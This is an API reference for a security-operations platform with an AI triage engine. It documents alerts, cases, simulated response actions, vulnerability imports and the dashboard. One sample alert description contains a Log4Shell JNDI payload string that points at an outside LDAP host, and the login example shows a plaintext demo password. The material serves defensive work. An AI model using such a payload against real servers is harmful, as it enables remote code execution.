# API reference

Base path: `/api`. All request and response bodies are JSON unless stated. Interactive documentation
(Swagger UI) is served at `/api/docs` and the OpenAPI schema at `/api/openapi.json`.

## Authentication

1. `POST /api/auth/login` with a **form-encoded** body (`application/x-www-form-urlencoded`,
   fields `username` and `password`), as defined by OAuth2's password flow.
2. The response contains `access_token` (a JWT signed with HS256 that carries `sub` = username, `role`,
   `iat`, `exp`) and the user.
3. Send it on every other call: `Authorization: Bearer <access_token>`.

The token is valid for `JWT_EXPIRE_MINUTES` (default 480). On each request the user is re-read from the
database; a missing, inactive or unknown user, or a bad/expired token, gives `401`. There is no refresh or
logout endpoint: the client discards the token. Swagger UI's *Authorize* button uses the same login form.

```bash
TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -d 'username=analyst&password=Analyst@12345' | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/dashboard
```

## Roles

| Role label below | Who may call |
|---|---|
| **public** | no token needed |
| **any** | any signed-in user: `admin`, `analyst`, `viewer` |
| **analyst** | `admin` or `analyst` |
| **admin** | `admin` only |

## Errors

| Status | Meaning |
|---|---|
| 400 | Request not valid in the current state (investigating a case with no alerts) |
| 401 | Missing, invalid or expired token; wrong username/password |
| 403 | Role not allowed: `{"detail": "Insufficient role for this action"}` |
| 404 | Alert, case, asset, vulnerability or listed alert ids not found |
| 409 | Username already exists |
| 413 | Too many alerts (> 1,000) or file larger than 20 MB |
| 422 | Validation error (FastAPI's `detail` list), unknown fields (request models forbid extra keys), invalid JSON/XML, XXE attempt |
| 500 | `{"detail": "Internal server error"}` (details only in server logs) |

Timestamps are UTC ISO 8601 with a trailing `Z`.

## Endpoint summary

| Method | Path | Role |
|---|---|---|
| GET | `/api/health` | public |
| POST | `/api/auth/login` | public |
| GET | `/api/auth/me` | any |
| GET | `/api/auth/users` | admin |
| POST | `/api/auth/users` | admin |
| GET | `/api/auth/audit` | admin |
| GET | `/api/alerts` | any |
| POST | `/api/alerts/ingest` | analyst |
| POST | `/api/alerts/upload` | analyst |
| GET | `/api/alerts/{alert_id}` | any |
| PATCH | `/api/alerts/{alert_id}` | analyst |
| POST | `/api/alerts/{alert_id}/investigate` | analyst |
| GET | `/api/alerts/{alert_id}/related` | any |
| GET | `/api/cases` | any |
| POST | `/api/cases` | analyst |
| POST | `/api/cases/auto-group` | analyst |
| GET | `/api/cases/{case_id}` | any |
| PATCH | `/api/cases/{case_id}` | analyst |
| DELETE | `/api/cases/{case_id}` | admin |
| POST | `/api/cases/{case_id}/alerts` | analyst |
| POST | `/api/cases/{case_id}/notes` | analyst |
| POST | `/api/cases/{case_id}/actions` | analyst |
| POST | `/api/cases/{case_id}/investigate` | analyst |
| POST | `/api/cases/{case_id}/chat` | analyst |
| GET | `/api/cases/{case_id}/report` | any |
| GET | `/api/va/assets` | any |
| PATCH | `/api/va/assets/{asset_id}` | analyst |
| GET | `/api/va/vulnerabilities` | any |
| POST | `/api/va/vulnerabilities` | analyst |
| PATCH | `/api/va/vulnerabilities/{vuln_id}` | analyst |
| POST | `/api/va/import/nmap` | analyst |
| GET | `/api/dashboard` | any |
| GET | `/api/mitre` | any |
| GET | `/api/playbooks` | any |

Every write endpoint, every AI call and every login attempt adds an audit-log entry (action names are
given per endpoint below).

---

## Health

### `GET /api/health` - public

```json
{ "status": "ok", "version": "1.1.0", "ai_provider": "offline" }
```

---

## Auth and users

### `POST /api/auth/login` - public

Form fields: `username`, `password`. Audit: `login`, `login_failed` or `login_locked`.

After 5 failed logins for a username, or 20 from one client IP, within 15 minutes (`LOGIN_MAX_FAILURES`,
`LOGIN_IP_MAX_FAILURES`, `LOGIN_LOCKOUT_MINUTES`), further attempts get `429` with a `Retry-After` header
(seconds), even with the correct password, until old failures age out of the window:

```json
{ "detail": "Too many failed login attempts. Try again in 15 minute(s)." }
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIs...",
  "token_type": "bearer",
  "user": {
    "id": 2, "username": "analyst", "full_name": "Tier-2 SOC Analyst", "role": "analyst",
    "is_active": true, "created_at": "2026-11-20T09:10:59.706440Z"
  }
}
```

Wrong credentials or an inactive user: `401 {"detail": "Invalid username or password"}`.

### `GET /api/auth/me` - any

Returns the user object shown above (never the password hash).

### `GET /api/auth/users` - admin

Array of user objects, ordered by id.

### `POST /api/auth/users` - admin, `201`

| Field | Type | Rules |
|---|---|---|
| `username` | string | 3-64 chars, `^[A-Za-z0-9._-]+$` |
| `full_name` | string | optional, max 128 |
| `role` | `admin` \| `analyst` \| `viewer` | default `analyst` |
| `password` | string | 10-128 chars |

Returns the new user object. `409` if the username exists. Audit: `user_created`.

### `GET /api/auth/audit` - admin

Query: `limit` (1-1000, default 200). Newest first.

```json
[
  { "id": 57, "actor": "analyst", "action": "response_action", "entity": "case", "entity_id": "1",
    "details": "{\"action\": \"block_ip\", \"target\": \"203.0.113.45\", \"simulated\": true}",
    "created_at": "2026-11-20T09:20:11.120000Z" }
]
```

---

## Alerts

### Alert summary object

Returned by list, ingest, related and inside cases.

```json
{
  "id": 11, "external_id": "WAF-9002", "source": "waf",
  "title": "Log4Shell JNDI exploit attempt in User-Agent",
  "severity": "critical", "status": "new", "verdict": "pending", "category": "web-attack",
  "host": "web-01", "username": "", "src_ip": "192.0.2.66", "dst_ip": "10.10.10.5",
  "risk_score": 90, "event_time": "2026-11-18T09:02:59.777018Z", "created_at": "2026-11-18T09:02:59.777018Z",
  "case_ids": [], "tactics": ["Initial Access"], "malicious_iocs": 1
}
```

Values: `severity` low/medium/high/critical; `status` new/triaged/investigating/closed; `verdict`
pending/true_positive/false_positive/benign/needs_review.

### `GET /api/alerts` - any

| Query | Meaning |
|---|---|
| `severity`, `status`, `verdict` | comma-separated lists, e.g. `severity=critical,high` |
| `source` | exact match |
| `host` | substring, case-insensitive |
| `q` | text search (max 200 chars) over title, description, host, username, src_ip, dst_ip |
| `sort` | `risk` (default: risk desc, then newest), `time` (newest), `oldest`, `severity` (critical first, then risk) |
| `limit` | 1-500, default 100 |
| `offset` | >= 0, default 0 |

```json
{ "total": 1, "items": [ { "...": "alert summary object" } ] }
```

### `POST /api/alerts/ingest` - analyst, `201`

```json
{
  "format": "auto",
  "investigate": false,
  "alerts": [
    { "title": "Cobalt Strike beacon detected", "severity": "high", "host": "web-01", "user": "deploy",
      "src_ip": "10.10.10.5", "dst_ip": "203.0.113.45",
      "description": "HTTPS beacon to cdn-sync.example every 60 seconds (command and control)" }
  ]
}
```

| Field | Rules |
|---|---|
| `alerts` | 1-1,000 items (more gives `413`); each item must be a JSON object |
| `format` | `auto` (default), `generic`, `wazuh`, `splunk`, `elastic` |
| `investigate` | `true` runs AI triage on every ingested alert |

Items that are not objects are reported, not fatal. Audit: `alerts_ingested`.

```json
{
  "ingested": 1,
  "errors": [ { "index": 1, "error": "Each alert must be a JSON object" } ],
  "alerts": [ { "...": "alert summary object" } ]
}
```

At most 50 errors and 200 alerts are echoed back.

### `POST /api/alerts/upload` - analyst, `201`

`multipart/form-data` with:

| Field | Meaning |
|---|---|
| `file` | JSON array, a single JSON object, an object with `alerts` / `results` / `hits.hits` (Elastic `_source` is unwrapped), or JSON Lines (`.jsonl`/`.ndjson`, or text not starting with `[` that contains `\n{`) |
| `format` | as above, default `auto`; unknown value gives `422` |
| `investigate` | boolean, default `false` |

Files over 20 MB give `413`; invalid JSON gives `422` with the line number. Response as for `/ingest`.

```bash
curl -s -H "Authorization: Bearer $TOKEN" -F file=@sample-data/wazuh_alerts.json \
     -F format=auto -F investigate=true http://localhost:8000/api/alerts/upload
```

### `GET /api/alerts/{alert_id}` - any

The summary object plus `description`, `raw`, `iocs`, `enrichment`, `mitre`, `ai_report`, `updated_at`.

```json
{
  "id": 11,
  "...": "summary fields",
  "description": "Request to :8080/api/search with User-Agent ${jndi:ldap://192.0.2.66:1389/Exploit} - Log4j JNDI lookup exploitation attempt.",
  "raw": { "id": "WAF-9002", "source": "waf", "severity": "critical", "...": "original event" },
  "iocs": [
    { "type": "ip", "value": "192.0.2.66", "reputation": "malicious", "score": 90,
      "tags": ["exploit-scanner", "log4shell"], "country": "CN", "asn": "AS64502 Example-Cloud",
      "malware_family": "", "source": "local-ti", "internal": false,
      "description": "Log4Shell / SQLi exploitation source" },
    { "type": "ip", "value": "10.10.10.5", "reputation": "unknown", "score": 0, "tags": ["internal"],
      "country": "", "asn": "", "malware_family": "", "source": "local-ti", "internal": true }
  ],
  "enrichment": {
    "ti_summary": { "malicious": 1, "suspicious": 0, "benign": 0, "unknown": 1 },
    "asset": {
      "asset": { "id": 1, "hostname": "web-01", "ip": "10.10.10.5", "os": "Ubuntu 20.04 LTS",
                 "criticality": "critical", "owner": "Web Platform Team" },
      "open_vulns": 3, "max_cvss": 10.0, "exploitable_count": 1,
      "top_vulns": [
        { "id": 1, "title": "Apache Log4j2 JNDI remote code execution (Log4Shell)", "cve": "CVE-2021-44228",
          "cvss": 10.0, "severity": "critical", "port": 8080, "exploit_available": true,
          "priority_score": 100.0, "status": "open" }
      ]
    },
    "risk_reasons": [
      { "points": 55, "reason": "Base score for critical severity" },
      { "points": 15, "reason": "1 malicious IOC(s) in threat intel: 192.0.2.66" },
      { "points": 10, "reason": "Target asset web-01 is critical criticality" },
      { "points": 8, "reason": "Target asset has 1 open vulnerability(ies) with a public exploit" },
      { "points": 2, "reason": "1 correlated alert(s) within the correlation window" }
    ],
    "related": [ { "id": 10, "title": "SQL injection attempt against /login",
                   "reasons": ["same host web-01", "same source IP 192.0.2.66", "shared IOC 192.0.2.66"] } ],
    "playbooks": [ { "id": "PB-WEBEXP", "name": "Web application exploitation", "score": 10 } ]
  },
  "mitre": [ { "id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access",
               "matched": ["..."], "url": "https://attack.mitre.org/techniques/T1190/" } ],
  "ai_report": null,
  "updated_at": "2026-11-20T09:11:00.100000Z"
}
```

`enrichment.asset` is `null` when no asset matches. The points in `risk_reasons` always add up to
`risk_score` (a negative `"Capped at 100"` entry is added when needed).

### `PATCH /api/alerts/{alert_id}` - analyst

Any of `status`, `verdict`, `severity`. Changing `severity` re-runs the analysis (and so the risk score).
Returns the full alert. Audit: `alert_updated`.

```json
{ "status": "closed", "verdict": "false_positive" }
```

### `POST /api/alerts/{alert_id}/investigate` - analyst

No body. Refreshes the analysis, runs the AI engine, stores `ai_report`, sets `verdict`, and moves a `new`
alert to `triaged`. Returns the full alert. Audit: `ai_investigation`. The report:

```json
{
  "summary": "Likely true positive: 'Log4Shell JNDI exploit attempt in User-Agent' on web-01. Risk 90/100; tactics: Initial Access. 1 indicator(s) are known-malicious.",
  "verdict": "true_positive",
  "confidence": 92,
  "severity": "critical",
  "attack_narrative": "Reconstructed in kill-chain order:\n1. Initial Access: Exploit Public-Facing Application (T1190) - alert #11: ...",
  "key_findings": ["Risk score 90/100 (...)", "Malicious ip 192.0.2.66 (exploit-scanner, log4shell, CN)", "..."],
  "mitre": [ { "id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access" } ],
  "recommended_actions": [
    { "action": "block_ip", "target": "192.0.2.66",
      "reason": "External IP malicious in threat intel (exploit-scanner, log4shell)", "priority": "immediate" }
  ],
  "iocs_to_block": ["192.0.2.66"],
  "open_questions": [
    "Which other hosts communicated with 192.0.2.66? Search proxy, DNS and firewall logs.",
    "Was CVE-2021-44228 on web-01 exploited? It is still open.",
    "What is the earliest evidence of compromise (patient zero), and is any data confirmed exfiltrated?"
  ],
  "playbooks": ["Web application exploitation", "Phishing & malicious attachment response", "Brute force & account compromise"],
  "engine": "offline"
}
```

If an LLM provider was configured but failed, `engine` is `"offline"` and an `engine_note` string explains
why.

### `GET /api/alerts/{alert_id}/related` - any

Alerts correlated within the correlation window: summary objects plus `reasons`.

```json
[ { "id": 10, "title": "SQL injection attempt against /login", "...": "summary fields",
    "reasons": ["same host web-01", "same source IP 192.0.2.66", "shared IOC 192.0.2.66"] } ]
```

---

## Cases

### Case summary object

```json
{
  "id": 1, "title": "Phishing to credential theft, C2 and exfiltration (finance-ws-07 -> fs-01)",
  "severity": "critical", "status": "contained", "assignee": "analyst", "created_by": "analyst",
  "created_at": "2026-11-20T03:50:59.777018Z", "updated_at": "2026-11-20T09:11:00.340381Z",
  "closed_at": null, "alert_count": 6, "max_risk": 100, "verdict": "true_positive"
}
```

`status` is open/investigating/contained/resolved/closed. `verdict` comes from the case AI report (or
`null`).

### Case detail object

The summary plus:

```json
{
  "summary": "Macro phishing led to PowerShell, Mimikatz, Cobalt Strike beaconing, RDP to fs-01 and a 2.3 GB upload.",
  "ai_report": { "...": "same shape as the alert AI report" },
  "alerts": [ { "...": "alert summary objects, oldest first" } ],
  "notes": [ { "id": 1, "author": "analyst", "content": "User confirms she opened the 'invoice' attachment. ...", "created_at": "..." } ],
  "actions": [ { "id": 1, "action": "isolate_host", "target": "finance-ws-07", "performed_by": "analyst",
                 "status": "simulated", "details": "Host network-isolated via EDR (simulated)", "created_at": "..." } ],
  "chat": [ { "id": 1, "role": "user", "content": "...", "author": "analyst", "engine": "", "created_at": "..." } ]
}
```

### `GET /api/cases` - any

Query: `status` (comma-separated), `limit` (1-500, default 200). Newest first. Array of summaries.

### `POST /api/cases` - analyst, `201`

```json
{ "title": "Web-01 investigation", "summary": "", "severity": null, "assignee": "", "alert_ids": [10, 11] }
```

`title` 3-512 chars (required); `summary` max 8,000; `severity` optional (default: highest severity of
the alerts, or `medium`); `assignee` defaults to the caller; `alert_ids` up to 1,000 (`404` if any is
missing). Linked alerts in `new` or `triaged` move to `investigating`. Returns the case detail. Audit:
`case_created`.

### `POST /api/cases/auto-group` - analyst, `201`

No body. Groups correlated open alerts that are not in any case (see ARCHITECTURE.md); new cases are
`open` and assigned to the caller. Audit: `case_auto_grouped` per case.

```json
{
  "created": 3,
  "cases": [
    { "id": 3, "title": "Ransomware: mass file encryption detected (+2 related)", "severity": "critical",
      "status": "open", "alert_count": 3, "max_risk": 97, "verdict": null, "...": "summary fields" }
  ]
}
```

### `GET /api/cases/{case_id}` - any

Case detail object.

### `PATCH /api/cases/{case_id}` - analyst

Any of `title`, `summary`, `severity`, `status`, `assignee`. Setting `status` to `resolved` or `closed`
sets `closed_at` (if not already set) and closes every alert in the case; any other status clears
`closed_at`. Returns the case detail. Audit: `case_updated`.

### `DELETE /api/cases/{case_id}` - admin, `204`

Deletes the case with its notes, actions and chat; the alerts remain. Audit: `case_deleted`.

### `POST /api/cases/{case_id}/alerts` - analyst

`{"alert_ids": [12, 13]}` (1-1,000 ids). Adds alerts not already linked. Returns the case detail.
Audit: `case_alerts_added`.

### `POST /api/cases/{case_id}/notes` - analyst, `201`

`{"content": "Checked WAF logs."}` (1-8,000 chars). Returns the case detail. Audit: `case_note_added`.

### `POST /api/cases/{case_id}/actions` - analyst, `201`

Records a **simulated** response action.

```json
{ "action": "block_ip", "target": "203.0.113.45", "details": "" }
```

`action` is one of `isolate_host`, `block_ip`, `block_domain`, `disable_user`, `reset_password`,
`quarantine_file`, `kill_process`, `collect_forensics` (anything else gives `422`); `target` 1-512 chars;
`details` max 2,000. The stored action has `status: "simulated"` and a fixed description such as
`"IP added to perimeter firewall deny list (simulated)"`. A containment action (all except
`reset_password` and `collect_forensics`) moves an `open` or `investigating` case to `contained`. Returns
the case detail. Audit: `response_action` with `"simulated": true`.

### `POST /api/cases/{case_id}/investigate` - analyst

No body. AI analysis of the whole case; stores `ai_report` and moves an `open` case to `investigating`.
`400` if the case has no alerts. Returns the case detail. Audit: `ai_investigation`.

### `POST /api/cases/{case_id}/chat` - analyst

`{"message": "What should I do next?"}` (1-2,000 chars). Both the question and the answer are stored.
Audit: `ai_chat`.

```json
{
  "answer": "Recommended next steps:\n- [immediate] quarantine_file 9f86d0...: File hash malicious in threat intel (dropper, macro), family Emotet-like loader (test hash)\n- ...\n- [immediate] isolate_host finance-ws-07: Host shows ... activity (done)\n...\nRelevant playbook: C2 beaconing & data exfiltration",
  "engine": "offline",
  "engine_note": null,
  "chat": [ { "id": 2, "role": "assistant", "content": "...", "author": "SentinelAI", "engine": "offline", "created_at": "..." } ]
}
```

### `GET /api/cases/{case_id}/report` - any

Markdown incident report: `Content-Type: text/markdown; charset=utf-8`,
`Content-Disposition: attachment; filename="case-<id>-incident-report.md"`. Sections: header (status,
severity, assignee, opened/closed), executive summary, verdict, attack narrative, key findings, alert
timeline table, ATT&CK techniques, IOC table, vulnerability exposure of affected assets, recommended
actions, response actions taken (simulated), analyst notes, open questions. Audit: `report_downloaded`.

---

## Vulnerability assessment

### `GET /api/va/assets` - any

Sorted by criticality (critical first), then maximum CVSS.

```json
[
  {
    "id": 1, "hostname": "web-01", "ip": "10.10.10.5", "os": "Ubuntu 20.04 LTS", "criticality": "critical",
    "owner": "Web Platform Team",
    "open_ports": [ { "port": 8080, "protocol": "tcp", "service": "http-proxy", "product": "Apache Tomcat 9.0.50" } ],
    "last_scanned": "2026-11-18T09:10:59.699852Z", "open_vulns": 3, "max_cvss": 10.0, "exploitable": 1
  }
]
```

`open_vulns`, `max_cvss` and `exploitable` count findings in status `open` or `in_progress`.

### `PATCH /api/va/assets/{asset_id}` - analyst

Any of `criticality` (low/medium/high/critical), `owner` (max 128), `os` (max 255). Changing criticality
recalculates the priority of every finding on the asset. Returns the asset. Audit: `asset_updated`.

### `GET /api/va/vulnerabilities` - any

Query: `severity`, `status` (comma-separated), `asset_id`, `limit` (1-2000, default 500). Sorted by
priority, then CVSS.

```json
[
  {
    "id": 1, "asset_id": 1, "asset": "web-01", "asset_criticality": "critical",
    "title": "Apache Log4j2 JNDI remote code execution (Log4Shell)", "cve": "CVE-2021-44228", "cvss": 10.0,
    "severity": "critical", "port": 8080, "service": "http-proxy",
    "description": "The Tomcat application bundles log4j-core 2.14.1. ...",
    "remediation": "Upgrade log4j-core to 2.17.1 or later; ...",
    "exploit_available": true, "status": "open", "source": "nessus", "priority_score": 100.0,
    "priority_explained": "CVSS 10.0 x 7 x 1.4 (critical asset) +12 public exploit (capped at 100) = 100.0",
    "first_seen": "2026-11-20T09:10:59.720537Z", "updated_at": "2026-11-20T09:10:59.785563Z"
  }
]
```

`priority_explained` spells out every term of `priority_score`: CVSS x 7 x criticality weight, `+12 public exploit`,
`+10 asset has open alerts`, and `(capped at 100)` when the cap applies.

### `POST /api/va/vulnerabilities` - analyst, `201`

Imports findings (Nessus, OpenVAS, manual pentest, ...) already in this shape. Unknown extra keys in a
finding are ignored.

```json
{
  "findings": [
    { "host": "pentest-box-01", "ip": "10.10.77.7", "title": "Default Tomcat manager credentials",
      "cve": "", "cvss": 9.8, "port": 8080, "service": "http", "exploit_available": true,
      "source": "pentest", "description": "", "remediation": "Change credentials" }
  ]
}
```

| Field | Rules |
|---|---|
| `findings` | 1-5,000 items |
| `host` | required, 1-255 chars; matched to an asset by hostname or IP, otherwise a new asset (criticality `medium`) is created |
| `title` | required, 1-512 chars |
| `cvss` | 0-10, default 0 |
| `port` | 0-65535 or null |
| `source` | `nmap`, `nessus`, `openvas`, `manual` (default), `pentest` |
| others | `cve` (max 32), `service` (max 64), `description`, `remediation` (max 8,000), `exploit_available` (bool), `ip` |

Findings are upserted by asset + title + port. Audit: `va_findings_imported`.

```json
{ "findings_created": 1, "findings_updated": 0, "assets_created": 1, "alerts_rescored": 0 }
```

### `PATCH /api/va/vulnerabilities/{vuln_id}` - analyst

`{"status": "fixed"}` - one of `open`, `in_progress`, `fixed`, `accepted_risk`, `false_positive`. Returns
the vulnerability. Audit: `vuln_status_changed`.

### `POST /api/va/import/nmap` - analyst, `201`

`multipart/form-data` with `file` = Nmap XML (`nmap ... -oX file.xml`), max 10 MB. XML with entity
declarations or an internal DTD subset, a root element other than `<nmaprun>`, or malformed XML is
rejected with `422` (audit: `nmap_import_rejected`). Audit on success: `nmap_imported`.

```bash
curl -s -H "Authorization: Bearer $TOKEN" -F file=@sample-data/nmap_scan.xml http://localhost:8000/api/va/import/nmap
```

```json
{ "hosts": 3, "assets_created": 2, "assets_updated": 1, "findings_created": 6, "findings_updated": 0, "alerts_rescored": 3 }
```

---

## Dashboard and reference data

### `GET /api/dashboard` - any

```json
{
  "kpis": {
    "total_alerts": 20, "open_alerts": 19, "critical_open": 5, "open_cases": 1, "mttr_hours": 2.3,
    "open_vulns": 9, "exploitable_vulns": 4, "true_positives": 11
  },
  "alerts_7d": [ { "date": "2026-11-20", "count": 6, "high": 5 } ],
  "by_severity": { "critical": 5, "high": 7, "medium": 5, "low": 2 },
  "by_verdict": { "true_positive": 11, "pending": 4, "needs_review": 1, "benign": 2, "false_positive": 2 },
  "top_risk": [ { "...": "up to 8 open alert summaries by risk" } ],
  "top_techniques": [ { "id": "T1071.001", "name": "Application Layer Protocol: Web Protocols",
                        "tactic": "Command and Control", "count": 2,
                        "url": "https://attack.mitre.org/techniques/T1071/001/" } ],
  "tactics": [ { "tactic": "Initial Access", "count": 5 } ],
  "top_iocs": [ { "value": "198.51.100.77", "type": "ip", "count": 3, "score": 88,
                  "tags": ["ssh-bruteforce", "scanner"] } ],
  "sources": [ { "source": "wazuh", "count": 7 } ],
  "ai_provider": "offline"
}
```

- `open_alerts`, `critical_open`, `by_severity`, `top_risk`: alerts whose status is not `closed`.
- `open_cases`: cases not `resolved` or `closed`.
- `mttr_hours`: mean of `closed_at - created_at` over cases with `closed_at` set, in hours (1 decimal), or
  `null`.
- `alerts_7d`: 7 entries, oldest first; `high` counts high + critical.
- `tactics`: always the 12 tactics in kill-chain order (number of alerts with at least one technique in it).
- `top_techniques`, `top_iocs`: top 8; `top_iocs` counts malicious IOCs only.

The numbers above are those of a freshly seeded database.

### `GET /api/mitre` - any

```json
{
  "tactics": ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Defense Evasion",
              "Credential Access", "Discovery", "Lateral Movement", "Collection", "Command and Control",
              "Exfiltration", "Impact"],
  "techniques": [
    { "id": "T1566", "name": "Phishing", "tactic": "Initial Access",
      "description": "Adversaries send phishing messages with malicious attachments or links to gain access.",
      "keywords": ["phishing", "phish", "spearphish", "malicious attachment", "suspicious email", "macro-enabled", "invoice lure"],
      "alert_count": 1, "url": "https://attack.mitre.org/techniques/T1566/" }
  ]
}
```

### `GET /api/playbooks` - any

```json
[
  {
    "id": "PB-PHISH", "name": "Phishing & malicious attachment response",
    "description": "Contain a user who opened a phishing lure and purge the campaign.",
    "triggers": { "techniques": ["T1566", "T1204.002"], "tactics": ["Initial Access"],
                  "keywords": ["phishing", "attachment", "email"] },
    "steps": [ "Pull the original email (headers, sender, URLs, attachment hash) from the mail gateway.", "..." ]
  }
]
```

The 8 playbooks are `PB-PHISH`, `PB-MALEXEC`, `PB-BRUTE`, `PB-WEBEXP`, `PB-LATERAL`, `PB-C2EXFIL`,
`PB-RANSOM`, `PB-PRIV`.
